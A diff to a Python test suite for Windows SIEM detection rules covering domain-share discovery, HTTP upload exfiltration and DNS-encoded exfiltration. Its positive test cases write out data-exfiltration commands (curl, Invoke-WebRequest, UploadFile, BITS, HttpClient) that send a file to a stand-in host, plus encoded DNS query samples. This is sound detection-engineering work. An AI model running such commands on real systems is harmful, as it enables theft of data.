@@ -55,28 +55,44 @@ class RuleHardeningTests(unittest.TestCase):
         broad_exclusion = re.compile(field_pattern(rules["100421"], "win.eventdata.sourceImage"))
         suppression = re.compile(field_pattern(rules["100427"], "win.eventdata.sourceImage"))
 
-        for path in [
+        benign_paths = [
             r"C:\Windows\system32\wbem\wmiprvse.exe",
             r"C:\Windows\system32\svchost.exe",
             r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.25070.5-0\MsMpEng.exe",
-        ]:
+        ]
+        for path in benign_paths:
             self.assertIsNotNone(broad_exclusion.search(path), path)
-        self.assertIsNotNone(suppression.search(r"C:\Windows\system32\svchost.exe"))
-        self.assertIsNotNone(
-            suppression.search(r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.25070.5-0\MsMpEng.exe")
-        )
+            doubled = path.replace("\\", "\\\\")
+            self.assertIsNotNone(broad_exclusion.search(doubled), doubled)
+        for path in [
+            r"C:\Windows\system32\svchost.exe",
+            r"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.25070.5-0\MsMpEng.exe",
+        ]:
+            self.assertIsNotNone(suppression.search(path), path)
+            doubled = path.replace("\\", "\\\\")
+            self.assertIsNotNone(suppression.search(doubled), doubled)
+        parent = child_text(rules["100421"], "if_sid")
+        self.assertIsNotNone(parent)
+        self.assertIn("92900", parent.split(",") if parent else [])
         self.assertIsNone(broad_exclusion.search(r"C:\Users\Public\renamed-dumper.exe"))
 
     def test_cmd_domain_discovery_matches_real_unc_share_syntax(self) -> None:
         rules = load_rules("cmd_detection.xml")
         domain_discovery = re.compile(field_pattern(rules["100312"], "win.eventdata.commandLine"))
-        for command in [
+        commands = [
             r"cmd.exe /c dir \\dc01\SYSVOL",
             r"cmd.exe /c type \\dc01\NETLOGON\logon.bat",
             r"cmd.exe /c net use \\dc01\ADMIN$",
-        ]:
+            "cmd.exe /c dir " + ("\\" * 4) + "dc01" + ("\\" * 2) + "SYSVOL",
+        ]
+        for command in commands:
             self.assertIsNotNone(domain_discovery.search(command), command)
-        self.assertIsNone(domain_discovery.search(r"cmd.exe /c dir \\fileserver\Public"))
+        false_positives = [
+            r"cmd.exe /c dir \\fileserver\Public",
+            "cmd.exe /c dir " + ("\\" * 4) + "fileserver" + ("\\" * 2) + "Public",
+        ]
+        for command in false_positives:
+            self.assertIsNone(domain_discovery.search(command), command)
 
     def test_asrep_rc4_child_is_versioned(self) -> None:
         rules = load_rules("asrep_roasting_detection.xml")
@@ -179,6 +195,16 @@ class RuleHardeningTests(unittest.TestCase):
 
     def test_http_has_rename_resistant_curl_and_generic_powershell_layers(self) -> None:
         rules = load_rules("http_exfiltration_detection.xml")
+        script_parent = child_text(rules["100532"], "if_sid")
+        process_parents = (child_text(rules["100530"], "if_sid") or "").replace(" ", "").split(",")
+        self.assertIn("67027", process_parents)
+        self.assertIn("92031", process_parents)
+        self.assertEqual(script_parent, "91816")
+        self.assertEqual(child_text(rules["100547"], "if_sid"), "91802")
+        self.assertEqual(
+            field_pattern(rules["100547"], "win.eventdata.scriptBlockText"),
+            field_pattern(rules["100532"], "win.eventdata.scriptBlockText"),
+        )
         metadata = rules["100544"]
         self.assertEqual(child_text(metadata, "if_sid"), "61603")
         self.assertIsNotNone(metadata.find("field[@name='win.eventdata.originalFileName']"))
@@ -190,6 +216,7 @@ class RuleHardeningTests(unittest.TestCase):
         positives = [
             'curl.exe --data-binary "@$p" "https://host/upload"',
             'Invoke-WebRequest -Uri https://host/upload -Method Put -InFile $p',
+            r'Invoke-WebRequest -Uri \"https://host/upload\" -Method Put -InFile $p',
             '$wc.UploadFile("https://host/upload", $p)',
             'Start-BitsTransfer -TransferType Upload -Source $p -Destination https://host/upload',
             '$content=[Net.Http.StreamContent]::new($stream);$client.PostAsync("https://host/upload",$content)',
@@ -206,10 +233,16 @@ class RuleHardeningTests(unittest.TestCase):
 
         high = rules["100545"]
         self.assertEqual(child_text(high, "if_sid"), "100532")
+        self.assertEqual(child_text(rules["100548"], "if_sid"), "100547")
+        self.assertEqual(
+            field_pattern(rules["100548"], "win.eventdata.scriptBlockText"),
+            field_pattern(high, "win.eventdata.scriptBlockText"),
+        )
         self.assertGreater(int(high.attrib["level"]), int(rules["100532"].attrib["level"]))
 
     def test_dns_encoded_label_and_burst_layers_generalize_transport(self) -> None:
         rules = load_rules("dns_exfiltration_detection.xml")
+        self.assertEqual(child_text(rules["100533"], "if_sid"), "60009")
         encoded = re.compile(field_pattern(rules["100533"], "win.eventdata.queryName"))
         self.assertIsNotNone(encoded.search("s.0.8.436c617373696669636174696f6e3d434f4e464944454e54.example"))
         self.assertIsNotNone(encoded.search("mfrggzdfmztwq2lkj5xw42lomv4gc3lqn5xw4zzomnxw2zls.example"))
@@ -222,7 +255,7 @@ class RuleHardeningTests(unittest.TestCase):
 
         burst = rules["100546"]
         self.assertEqual(child_text(burst, "if_matched_sid"), "100533")
-        self.assertEqual(burst.attrib.get("frequency"), "5")
+        self.assertEqual(burst.attrib.get("frequency"), "9")
         self.assertEqual(burst.attrib.get("timeframe"), "15")
         self.assertEqual(child_text(burst, "same_field"), "win.system.processID")
 
@@ -278,7 +311,7 @@ class RuleHardeningTests(unittest.TestCase):
         root = RULES.parent
         dashboard = (root / "dashboard_queries.md").read_text(encoding="utf-8")
         families = {
-            "http_exfiltration_detection.xml": ("http_exfiltration_cmd.md", {"100530", "100531", "100532", "100544", "100545"}),
+            "http_exfiltration_detection.xml": ("http_exfiltration_cmd.md", {"100530", "100531", "100532", "100544", "100545", "100547", "100548"}),
             "dns_exfiltration_detection.xml": ("dns_exfiltration_cmd.md", {"100533", "100534", "100535", "100546"}),
         }
         for xml_name, (playbook_name, expected) in families.items():
